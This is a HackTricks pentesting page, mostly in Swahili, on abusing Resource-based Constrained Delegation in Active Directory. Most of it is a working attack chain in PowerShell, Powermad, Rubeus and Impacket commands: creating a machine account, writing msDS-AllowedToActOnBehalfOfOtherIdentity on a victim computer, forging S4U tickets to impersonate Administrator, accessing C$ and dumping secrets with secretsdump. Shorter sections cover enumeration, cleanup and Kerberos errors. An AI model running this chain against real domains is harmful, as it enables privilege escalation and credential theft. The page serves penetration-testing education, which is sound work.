# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Misingi ya Resource-based Constrained Delegation

Hii ni sawa na podstawowe [Constrained Delegation](constrained-delegation.md) lakini **badala** ya kumpatia ruhusa object ku**igiza** mtumiaji yeyote dhidi ya mashine. Resource-based Constrain Delegation **inaweka** ndani ya **object** ni nani anayeweza kuiga mtumiaji yeyote dhidi yake.

Katika kesi hii, object iliyowekwa constrained itakuwa na sifa iitwayo _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ yenye jina la mtumiaji anayeweza kuiga mtumiaji mwingine yeyote dhidi yake.

Tofauti nyingine muhimu kutoka Constrained Delegation kwa delegations nyingine ni kwamba mtumiaji yeyote mwenye **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) anaweza kuweka **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (Katika aina nyingine za Delegation ulihitaji ruhusa za domain admin).

### Dhana mpya

Katika Constrained Delegation ilisemwa kuwa bendera ya **`TrustedToAuthForDelegation`** ndani ya thamani ya _userAccountControl_ ya mtumiaji inahitajika kutekeleza **S4U2Self.** Lakini hiyo sio ukweli kamili. Ukweli ni kwamba hata bila thamani hiyo, unaweza kufanya **S4U2Self** dhidi ya mtumiaji yeyote ikiwa wewe ni **service** (una SPN) lakini, ikiwa una **`TrustedToAuthForDelegation`** TGS inayorudishwa itakuwa **Forwardable** na ikiwa **huna** bendera hiyo TGS inayorudishwa **haitakuwa** **Forwardable**.

Hata hivyo, ikiwa **TGS** inayotumika katika **S4U2Proxy** si **Forwardable**, kujaribu kutumika kwa **basic Constrain Delegation** hautafanya kazi. Lakini ikiwa unajaribu kuchochea **Resource-Based constrain delegation**, itafanya kazi.

### Muundo wa shambulio

> Ikiwa una **write equivalent privileges** juu ya akaunti ya **Computer** unaweza kupata **ufikiaji wa ruhusa** kwenye mashine hiyo.

Tuseme mshambulizi tayari ana **write equivalent privileges over the victim computer**.

1. Mshambulizi anapata udhibiti wa akaunti ambayo ina **SPN** au **anaunda moja** (“Service A”). Kumbuka kuwa **mtumiaji yeyote wa Admin** bila ruhusa nyingine maalum anaweza **kuunda** hadi vitu 10 vya Computer (**_MachineAccountQuota_**) na kuweka SPN. Hivyo mshambulizi anaweza tu kuunda Computer object na kuweka SPN.
2. Mshambulizi **anatumia vibaya idhini yake ya WRITE** juu ya kompyuta ya mwathiriwa (ServiceB) ili kusanidi **resource-based constrained delegation ili kumruhusu ServiceA kuiga mtumiaji yeyote** dhidi ya kompyuta hiyo ya mwathiriwa (ServiceB).
3. Mshambulizi anatumia Rubeus kufanya **full S4U attack** (S4U2Self na S4U2Proxy) kutoka Service A hadi Service B kwa mtumiaji **aliye na privileged access to Service B**.
1. S4U2Self (kutoka kwa akaunti ya SPN iliyoharibiwa/iliyoundwa): Omba **TGS of Administrator to me** (Not Forwardable).
2. S4U2Proxy: Tumia **not Forwardable TGS** ya hatua iliyotangulia kuomba **TGS** kutoka kwa **Administrator** hadi **victim host**.
3. Hata kama unatumia TGS isiyo Forwardable, kwa kuwa unachochea Resource-based constrained delegation, itafanya kazi.
4. Mshambulizi anaweza **pass-the-ticket** na **kuiga** mtumiaji kupata **ufikiaji wa victim ServiceB**.

Kuangalia _**MachineAccountQuota**_ ya domain unaweza kutumia:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Shambulio

### Kuunda object ya kompyuta

Unaweza kuunda object ya kompyuta ndani ya kikoa kwa kutumia **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Kusanidi Resource-based Constrained Delegation

**Kutumia activedirectory PowerShell module**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Kutumia powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Kutekeleza kikamilifu S4U attack (Windows/Rubeus)

Kwanza kabisa, tuliunda Computer object mpya na password `123456`, hivyo tunahitaji hash ya password hiyo:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Hii itachapisha RC4 na AES hashes kwa akaunti hiyo.\
Sasa, the attack inaweza kufanywa:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Unaweza kuunda tiketi zaidi kwa huduma zaidi kwa kuomba mara moja ukitumia `/altservice` param ya Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Kumbuka kuwa watumiaji wana sifa iitwayo "**Cannot be delegated**". Ikiwa mtumiaji ana sifa hii ikiwa True, hutaweza kujifanya yeye. Sifa hii inaweza kuonekana ndani ya bloodhound.
 
### Zana za Linux: RBCD kutoka mwanzo hadi mwisho na Impacket (2024+)

Ikiwa unafanya kazi kutoka Linux, unaweza kutekeleza mnyororo kamili wa RBCD kwa kutumia zana rasmi za Impacket:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notes
- Ikiwa LDAP signing/LDAPS imetekelezwa, tumia `impacket-rbcd -use-ldaps ...`.
- Tendeuka kwa vijenzi vya AES; domain nyingi za kisasa zinazuia RC4. Impacket na Rubeus zote zinasaidia michakato ya AES-tu.
- Impacket inaweza kuandika upya `sname` ("AnySPN") kwa baadhi ya zana, lakini pata SPN sahihi inapowezekana (mfano, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Kupata Ufikiaji

Amri ya mwisho itafanya **shambulio kamili la S4U na itaingiza TGS** kutoka kwa Administrator hadi kwenye mwenyeji wa mhusika ndani ya **kumbukumbu**.\
Katika mfano huu ilitoa ombi la TGS kwa huduma ya **CIFS** kutoka kwa Administrator, hivyo utaweza kufikia **C$**:
```bash
ls \\victim.domain.local\C$
```
### Tumia vibaya tikiti mbalimbali za huduma

Jifunze kuhusu [**available service tickets here**](silver-ticket.md#available-services).

## Kuorodhesha, ukaguzi na usafishaji

### Kuorodhesha kompyuta zilizo na RBCD iliyosanidiwa

PowerShell (kufasiri SD ili kutatua SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (read au flush kwa amri moja):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Usafishaji / kuweka upya RBCD

- PowerShell (futa sifa):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Makosa ya Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Hii ina maana kwamba Kerberos imewekwa kuto kutumia DES au RC4 na unatoa tu hash ya RC4. Toa kwa Rubeus angalau hash ya AES256 (au toa tu rc4, aes128 na aes256 hashes). Example: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Hii ina maana kwamba saa ya kompyuta ya sasa ni tofauti na ile ya DC na Kerberos haifanyi kazi vizuri.
- **`preauth_failed`**: Hii ina maana kwamba username + hashes zilizotolewa hazifanyi kazi kuingia. Huenda umeisahau kuweka "$" ndani ya username wakati wa kuzalisha hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Hii inaweza kumaanisha:
- User unayejaribu kuigiza hawezi kufikia service inayotakiwa (kwa sababu hauwezi kuigiza au kwa sababu haina ruhusa za kutosha)
- Service uliyoomba haipo (kama unaomba tiketi ya winrm lakini winrm haikuwashwa)
- fakecomputer ulioundwa ameisha kupata ruhusa zake juu ya server iliyo na udhaifu na unahitaji kuzirudisha.
- Unavunja KCD ya kawaida; kumbuka RBCD inafanya kazi na tiketi za S4U2Self zisizoweza kupelekwa (non-forwardable), wakati KCD inahitaji forwardable.

## Vidokezo, relays na mbadala

- Unaweza pia kuandika RBCD SD kupitia AD Web Services (ADWS) ikiwa LDAP imechujwa. See:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chains mara nyingi zinaisha kwa RBCD ili kupata local SYSTEM kwa hatua moja. See practical end-to-end examples:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Ikiwa LDAP signing/channel binding imezimwa na unaweza kuunda machine account, zana kama **KrbRelayUp** zinaweza kurelay auth iliyelikwa ya Kerberos hadi LDAP, kuweka `msDS-AllowedToActOnBehalfOfOtherIdentity` kwa machine account yako kwenye target computer object, na mara moja kuigiza **Administrator** kupitia S4U kutoka off-host.

## Marejeleo

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
